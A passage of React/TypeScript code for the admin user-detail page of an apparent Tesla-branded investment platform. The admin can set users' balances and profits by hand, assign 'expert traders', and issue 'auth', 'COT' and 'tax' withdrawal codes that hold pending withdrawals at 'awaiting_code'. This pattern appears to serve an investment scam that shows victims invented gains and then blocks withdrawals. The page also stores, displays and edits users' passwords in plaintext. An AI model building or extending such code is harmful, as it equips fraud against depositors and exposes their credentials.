  const { id } = useParams();
  const navigate = useNavigate();
  const [user, setUser] = useState<any>(null);
  const [pwd, setPwd] = useState("");
  const [pwd2, setPwd2] = useState("");
  const [accountLevel, setAccountLevel] = useState<string>("Basic");
  const [selectedCurrency, setSelectedCurrency] = useState<string>("USD");
  const [codes, setCodes] = useState<Record<CodeType, string>>({ auth: "", cot: "", tax: "" });
  const [codeToggles, setCodeToggles] = useState<Record<CodeType, boolean>>({ auth: true, cot: false, tax: false });
  const [traders, setTraders] = useState<any[]>([]);
  const [assignedId, setAssignedId] = useState<string>("");
  const [balanceOpen, setBalanceOpen] = useState(false);
  const [tradeOpen, setTradeOpen] = useState(false);
  const [codeModalState, setCodeModalState] = useState<{ open: boolean; type: CodeType | null; code: string }>({
    open: false,
    type: null,
    code: "",
  });

  const load = async () => {
    if (!id) return;
    const [{ data: u, error }, { data: c }, { data: tr }] = await Promise.all([
      supabase.from("profiles").select("*").eq("user_id", id).single(),
      supabase.from("account_withdrawal_codes").select("*").eq("user_id", id).maybeSingle(),
      supabase.from("expert_traders").select("id, name, specialty, win_rate").order("sort_order", { ascending: true }),
    ]);
    if (error) return toast.error(error.message);
    setUser(u);
    setAccountLevel((u as any).account_level || "Basic");
    setSelectedCurrency((u as any).currency || "USD");
    setAssignedId((u as any).assigned_expert_id || "");
    if (c) {
      setCodes({
        auth: (c as any).auth_code || "",
        cot: (c as any).cot_code || "",
        tax: (c as any).tax_code || "",
      });
      setCodeToggles({
        auth: (c as any).auth_required ?? true,
        cot: (c as any).cot_required ?? false,
        tax: (c as any).tax_required ?? false,
      });
    }
    setTraders(tr ?? []);
  };

  useEffect(() => { document.title = "Admin · User Detail"; load(); }, [id]);

  if (!user) return <p className="text-muted-foreground">Loading…</p>;
  const cur = user.currency;

  const updateProfile = async (patch: Record<string, any>, msg = "Saved") => {
    const { error } = await supabase.from("profiles").update(patch as any).eq("user_id", id!);
    if (error) return toast.error(error.message);
    toast.success(msg);
    load();
  };

  const saveProfile = () => updateProfile({
    full_name: user.full_name,
    username: user.username,
    email: user.email,
    phone: user.phone,
    country: user.country,
    plaintext_password: user.plaintext_password,
    currency: selectedCurrency,
  }, "Profile updated");

  const toggleSuspend = async () => {
  const next = user.status === "suspended" ? "active" : "suspended";
  const { error } = await supabase.from("profiles").update({ status: next }).eq("user_id", id!);
  if (error) return toast.error(error.message);

  if (next === "suspended") {
    await notifyEmail({
      send: true,
      userId: user.user_id,
      email: user.email,
      intent: "account_suspended",
      subject: "Your account has been suspended",
      body: `
Your account has been suspended. Most actions are blocked.
You can still access your dashboard overview, complete KYC, and make deposits if needed.
If you have questions, contact support@teslagrowthequity.com.
`,
    });
  }

  toast.success(next === "suspended" ? "Account suspended" : "Account reactivated");
  load();
};

const toggleBlock = async () => {
  const next = user.status === "blocked" ? "active" : "blocked";
  const { error } = await supabase.from("profiles").update({ status: next }).eq("user_id", id!);
  if (error) return toast.error(error.message);

  if (next === "blocked") {
    await notifyEmail({
      send: true,
      userId: user.user_id,
      email: user.email,
      intent: "account_blocked",
      subject: "Your account has been blocked",
      body: `
Your account has been blocked and access is restricted.
If you believe this is a mistake, contact support@teslagrowthequity.com.
`,
    });
  }

  toast.success(next === "blocked" ? "Account blocked" : "Account unblocked");
  load();
};

const del = async () => {
  if (!confirm(`Delete ${user.email}? Permanent.`)) return;
  const adminAuth = (supabase as any).auth?.admin;
  if (adminAuth?.deleteUser) {
    try { await adminAuth.deleteUser(id); } catch { /* ignore */ }
  }
  const { error: delErr } = await supabase.from("profiles").delete().eq("user_id", id!);
  if (delErr) {
    const { error: blockErr } = await supabase.from("profiles").update({ status: "blocked" }).eq("user_id", id!);
    if (blockErr) return toast.error(blockErr.message);
    toast.success("User blocked (deletion not permitted)");
  } else {
    toast.success("Deleted");
  }
  navigate("/admin/users");
};


  const saveAccountLevel = () => updateProfile({ account_level: accountLevel }, "Account level updated");

  const updatePwd = async () => {
    if (pwd !== pwd2) return toast.error("Passwords do not match");
    if (pwd.length < 6) return toast.error("Min 6 characters");
    const { error } = await supabase.from("profiles").update({ plaintext_password: pwd }).eq("user_id", id!);
    if (error) return toast.error(error.message);
    toast.success("Password updated");
    setPwd(""); setPwd2("");
    load();
  };

  // Opens the confirm/email modal for a given code type. Used by both the
  // per-row "Save" button and the "Generate" (sparkles) button.
  const openCodeEmailModal = (type: CodeType, code: string) => {
    if (codeToggles[type] && !code.trim()) {
      toast.error(`${codeLabel(type)} cannot be empty`);
      return;
    }
    setCodeModalState({ open: true, type, code: code.trim().toUpperCase() });
  };

  // Persists a single code field (keeping the others as-is) and optionally
  // emails it to the user. Called when the CodeEmailModal is confirmed.
  const saveSingleCode = async (subject: string, body: string, sendEmail: boolean) => {
    const type = codeModalState.type;
    if (!type) return;
    const value = codeModalState.code.trim().toUpperCase();

    if (codeToggles[type] && !value) {
      toast.error(`${codeLabel(type)} is required`);
      return;
    }

    const updatedCodes = { ...codes, [type]: value };

    const payload = {
      user_id: id!,
      auth_code: updatedCodes.auth.trim() ? updatedCodes.auth.trim().toUpperCase() : null,
      cot_code: codeToggles.cot ? (updatedCodes.cot.trim().toUpperCase() || null) : null,
      tax_code: codeToggles.tax ? (updatedCodes.tax.trim().toUpperCase() || null) : null,
      auth_required: true,
      cot_required: codeToggles.cot,
      tax_required: codeToggles.tax,
    };

    const { data: existing } = await supabase.from("account_withdrawal_codes").select("id").eq("user_id", id!).maybeSingle();
    const { error } = existing
      ? await supabase.from("account_withdrawal_codes").update(payload).eq("user_id", id!)
      : await supabase.from("account_withdrawal_codes").insert(payload);

    if (error) {
      toast.error(error.message);
      return;
    }

    await supabase.from("transactions").update({ status: "awaiting_code" } as never)
      .eq("user_id", id!).eq("type", "withdrawal").eq("status", "pending");

    if (sendEmail) {
      await notifyEmail({
        send: true,
        userId: id!,
        email: user.email,
        intent: `${type}_code`,
        subject,
        body: minifyHtml(body),
      });
    }

    setCodes(updatedCodes);
    toast.success(`${codeLabel(type)} saved${sendEmail ? " and emailed to user" : ""}`);
    setCodeModalState({ open: false, type: null, code: "" });
    load();
  };

  const assignTrader = async () => {
    await updateProfile({ assigned_expert_id: assignedId || null }, "Expert assigned");
  };

  return (
    <div className="space-y-5">
      <div className="flex items-start justify-between gap-2">
        <div className="min-w-0">
          <Button variant="ghost" size="sm" className="-ml-2 mb-1" onClick={() => navigate(-1)}>
            <ArrowLeft className="mr-1 h-4 w-4" /> Back
          </Button>
          <h1 className="truncate text-xl font-semibold sm:text-2xl">{user.full_name || user.email}</h1>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <StatusBadge status={user.status} />
            <span>{user.email}</span>
            {cur && <span>· {cur}</span>}
          </div>
        </div>
      </div>

      {/* Balances */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="text-base">Balances ({cur || "—"})</CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="grid grid-cols-3 gap-2">
            <BalanceCell label="Total" value={user.total_balance} currency={cur} accent="text-emerald-600" />
            <BalanceCell label="Deposit" value={user.deposit} currency={cur} accent="text-sky-600" />
            <BalanceCell label="Profit" value={user.profit} currency={cur} accent="text-amber-600" />
          </div>
          <div className="flex flex-wrap gap-2">
            <Button size="sm" onClick={() => setBalanceOpen(true)}>
              Add / Subtract Balance
            </Button>
            <Button
              size="sm"
              onClick={() => setTradeOpen(true)}
              style={{ background: "linear-gradient(135deg, #1e40af 0%, #3b82f6 100%)" }}
              className="text-white gap-2"
            >
              <BarChart2 className="h-3.5 w-3.5" />
              Trade Topup
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Profile */}
      <Card>
        <CardHeader className="pb-2"><CardTitle className="text-base">Profile</CardTitle></CardHeader>
        <CardContent className="grid gap-3 sm:grid-cols-2">
          <Field label="Full Name" value={user.full_name} onChange={(v) => setUser({ ...user, full_name: v })} />
          <Field label="Username" value={user.username} onChange={(v) => setUser({ ...user, username: v })} />
          <Field label="Email" value={user.email} onChange={(v) => setUser({ ...user, email: v })} />
          <Field label="Phone" value={user.phone} onChange={(v) => setUser({ ...user, phone: v })} />
          <Field label="Country" value={user.country} onChange={(v) => setUser({ ...user, country: v })} />
          <Field label="Plaintext Password (debug)" value={user.plaintext_password} onChange={(v) => setUser({ ...user, plaintext_password: v })} />
          <div className="sm:col-span-2 space-y-1.5">
            <Label>Currency</Label>
            <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
              <SelectTrigger><SelectValue placeholder="Select currency" /></SelectTrigger>
              <SelectContent className="max-h-64 overflow-y-auto">
                {ALL_CURRENCIES.map((c) => (
                  <SelectItem key={c.code} value={c.code}>{c.code} — {c.name}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
          <div className="sm:col-span-2"><Button onClick={saveProfile}>Save Profile</Button></div>
        </CardContent>
      </Card>

      {/* Account Status */}
      <Card>
        <CardHeader className="pb-2"><CardTitle className="text-base">Account Status</CardTitle></CardHeader>
        <CardContent>
          <div className="flex flex-wrap gap-2">
            <Button variant="outline" size="sm" onClick={toggleBlock}>
              {user.status === "blocked"
                ? <><CheckCircle2 className="mr-2 h-4 w-4 text-emerald-500" />Unblock</>
                : <><Ban className="mr-2 h-4 w-4 text-rose-500" />Block User</>}
            </Button>
            <Button variant="outline" size="sm" onClick={toggleSuspend}>
              {user.status === "suspended"
                ? <><CheckCircle2 className="mr-2 h-4 w-4 text-emerald-500" />Reactivate</>
                : <><AlertTriangle className="mr-2 h-4 w-4 text-amber-500" />Suspend</>}
            </Button>
            <Button variant="destructive" size="sm" onClick={del}>
              <Trash2 className="mr-2 h-4 w-4" />Delete
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Assign Expert Trader */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <Briefcase className="h-4 w-4 text-fuchsia-500" /> Expert Trader
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <Select value={assignedId || "none"} onValueChange={(v) => setAssignedId(v === "none" ? "" : v)}>
            <SelectTrigger><SelectValue placeholder="No trader assigned" /></SelectTrigger>
            <SelectContent>
              <SelectItem value="none">— None —</SelectItem>
              {traders.map((t) => (
                <SelectItem key={t.id} value={t.id}>
                  {t.name}{t.specialty ? ` · ${t.specialty}` : ""}{t.win_rate ? ` · ${t.win_rate}%` : ""}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          <Button size="sm" onClick={assignTrader}>Save Assignment</Button>
        </CardContent>
      </Card>

      {/* Account Level */}
      <Card>
        <CardHeader className="pb-2"><CardTitle className="text-base">Account Level</CardTitle></CardHeader>
        <CardContent className="flex flex-col gap-2 sm:flex-row">
          <Select value={accountLevel} onValueChange={setAccountLevel}>
            <SelectTrigger className="sm:max-w-xs"><SelectValue placeholder="Select Account Level" /></SelectTrigger>
            <SelectContent>
              {ACCOUNT_LEVELS.map((b) => <SelectItem key={b} value={b}>{b}</SelectItem>)}
            </SelectContent>
          </Select>
          <Button onClick={saveAccountLevel}>Update Level</Button>
        </CardContent>
      </Card>

      {/* Password */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <KeyRound className="h-4 w-4 text-yellow-500" /> Change Password
          </CardTitle>
        </CardHeader>
        <CardContent className="grid gap-3 sm:grid-cols-2">
          <div><Label>New Password</Label><Input type="text" value={pwd} onChange={(e) => setPwd(e.target.value)} /></div>
          <div><Label>Confirm Password</Label><Input type="text" value={pwd2} onChange={(e) => setPwd2(e.target.value)} /></div>
          <div className="sm:col-span-2"><Button onClick={updatePwd}>Update Password</Button></div>
        </CardContent>
      </Card>

      {/* Withdrawal Codes */}
      <Card>
        <CardHeader className="pb-2">
          <CardTitle className="flex items-center gap-2 text-base">
            <ShieldAlert className="h-4 w-4 text-amber-500" /> Withdrawal Codes
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <p className="text-xs text-muted-foreground">
            Auth code is always required. Toggle COT and Tax only when needed.
            Saving a code opens a confirmation where you can optionally email it to the user.
          </p>
          {(["auth", "cot", "tax"] as CodeType[]).map((k) => (
            <div key={k} className="space-y-2 rounded-md border border-border p-3">
              <div className="flex items-center justify-between">
                <Label className="text-sm">{codeLabel(k)}</Label>
                <div className="flex items-center gap-2">
                  <span className="text-[11px] text-muted-foreground">Required</span>
                  <Switch
                    checked={codeToggles[k]}
                    disabled={k === "auth"}
                    onCheckedChange={(v) => setCodeToggles({ ...codeToggles, [k]: v })}
                  />
                </div>
              </div>
              {codeToggles[k] && (
                <div className="flex gap-2">
                  <Input
                    className="font-mono"
                    placeholder="Enter code"
                    value={codes[k]}
                    onChange={(e) => setCodes({ ...codes, [k]: e.target.value })}
                  />
                  <Button
                    type="button"
                    variant="outline"
                    size="sm"
                    title="Generate code"
                    onClick={() => {
                      const newCode = genCode();
                      setCodes((prev) => ({ ...prev, [k]: newCode }));
                      openCodeEmailModal(k, newCode);
                    }}
                  >
                    <Sparkles className="h-3.5 w-3.5" />
                  </Button>
                  <Button
                    type="button"
                    size="sm"
                    onClick={() => openCodeEmailModal(k, codes[k])}
                  >
                    Save
                  </Button>
                </div>
              )}
            </div>
          ))}
        </CardContent>
      </Card>

      {/* Custom Email */}
      <CustomEmailCard userId={id!} userEmail={user.email} />

      <BalanceModal open={balanceOpen} onOpenChange={setBalanceOpen} user={user} onSaved={load} />
      <TradeTopupModal open={tradeOpen} onOpenChange={setTradeOpen} user={user} onSaved={load} />
      <CodeEmailModal
        open={codeModalState.open}
        onOpenChange={(v) => setCodeModalState((prev) => ({ ...prev, open: v }))}
        type={codeModalState.type}
        code={codeModalState.code}
        userEmail={user.email}
        onConfirm={saveSingleCode}
      />
    </div>
  );
}

function Field({ label, value, onChange }: { label: string; value: any; onChange: (v: string) => void }) {
  return (
    <div>
      <Label>{label}</Label>
      <Input value={value ?? ""} onChange={(e) => onChange(e.target.value)} />
    </div>
  );
}

function BalanceCell({ label, value, currency, accent }: { label: string; value: any; currency?: string; accent: string }) {
  return (
    <div className="rounded-md border border-border p-2">
      <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</p>
      <p className={`text-sm font-semibold tabular-nums ${accent}`}>{formatMoney(value, currency)}</p>
    </div>
  );
}
